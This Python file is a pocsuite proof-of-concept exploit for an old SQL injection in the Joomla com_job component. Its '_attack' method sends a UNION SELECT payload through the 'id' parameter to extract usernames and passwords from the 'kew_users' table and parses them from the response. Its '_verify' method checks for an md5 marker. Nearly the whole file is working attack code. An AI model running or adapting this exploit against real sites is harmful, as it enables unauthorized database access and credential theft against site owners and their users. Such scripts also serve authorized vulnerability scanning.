#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '67141'  # ssvid
    version = '1.0'
    author = ['hhxx']
    vulDate = '2009-12-08'
    createDate = '2016-01-14'
    updateDate = '2016-01-14'
    references = ['http://www.sebug.net/vuldb/ssvid-67141']
    name = 'Joomla Component com_job (showMoreUse) SQL injection vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla Component com_job'
    appVersion = 'N/A'
    vulType = 'SQL injection'
    desc = u'''
        Joomla! Component com_job 组件'index.php' SQL注入漏洞
        Joomla! Component com_job 组件的index.php中存在SQL注入漏洞。
        远程攻击者可以借助一个option操作中的id参数，执行任意SQL指令。
    '''
    samples = ['']

    def _attack(self):
        result = {}
        payload = '/index.php?option=com_job&task=showMoreUser&id=-1+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,%s,17,18,19,20,21,22,23,24,25+from+kew_users--'
        payload = payload % 'concat(0x757365723d,username,0x3a,0x70617373776f72643d,password,0x3a)'
        vul_url = '%s%s' % (self.url,payload)
        res = req.get(vul_url,timeout = 10)
        Username = re.search("(user=(?P<username>.*?):)",res.content) 
        Password = re.search("(password=(?P<password>.*?):)",res.content) 
        if Username and Password: 
            result['Database'] = {}
            result['Database']['Username'] = Username.group("username")
            result['Database']['Password'] = Password.group("password")
        return self.parse_output(result)

    def _verify(self):
        result = {}
        payload = '/index.php?option=com_job&task=showMoreUser&id=-1+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,%s,17,18,19,20,21,22,23,24,25+from+kew_users--'
        payload = payload % 'md5(1)'
        vul_url = '%s%s' % (self.url,payload)
        res = req.get(vul_url,timeout = 10)
        if 'c4ca4238a0b923820dcc509a6f75849b' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)